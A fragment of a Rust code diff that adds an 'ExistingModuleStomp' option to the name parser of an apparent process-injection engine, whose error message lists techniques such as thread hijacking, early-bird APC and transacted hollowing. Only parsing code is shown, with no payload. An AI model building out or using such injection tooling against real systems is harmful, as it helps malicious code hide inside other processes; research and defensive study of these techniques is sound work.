 ///   `"NtSetInfoProcess"`           → `InjectionTechnique::NtSetInfoProcess { target_pid: 0 }`
 ///   `"TransactedHollowing"`        → `InjectionTechnique::TransactedHollowing`
 ///   `"DelayedModuleStomp"`         → `InjectionTechnique::DelayedModuleStomp`
+///   `"ExistingModuleStomp"`        → `InjectionTechnique::ExistingModuleStomp`
 ///
 /// `target_pid` fields in the returned technique are set to 0 because the
 /// engine fills in the actual PID during dispatch.
@@ -9929,6 +10202,7 @@ pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
         "ContextOnly" => Ok(InjectionTechnique::ContextOnly),
         "TransactedHollowing" => Ok(InjectionTechnique::TransactedHollowing),
         "DelayedModuleStomp" => Ok(InjectionTechnique::DelayedModuleStomp),
+        "ExistingModuleStomp" => Ok(InjectionTechnique::ExistingModuleStomp),
         "ThreadPool" => Ok(InjectionTechnique::ThreadPool { variant: None }),
         "WaitingThreadHijack" => Ok(InjectionTechnique::WaitingThreadHijack {
             target_pid: 0,
@@ -9981,7 +10255,7 @@ pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
              EarlyBirdApc, ThreadHijack, ThreadPool[:Variant], FiberInject, \
              ContextOnly, WaitingThreadHijack, CallbackInjection[:Api], \
              SectionMapping[:Method|Enhanced], NtSetInfoProcess, \
-             TransactedHollowing, DelayedModuleStomp",
+             TransactedHollowing, DelayedModuleStomp, ExistingModuleStomp",
             other
         )),
     }
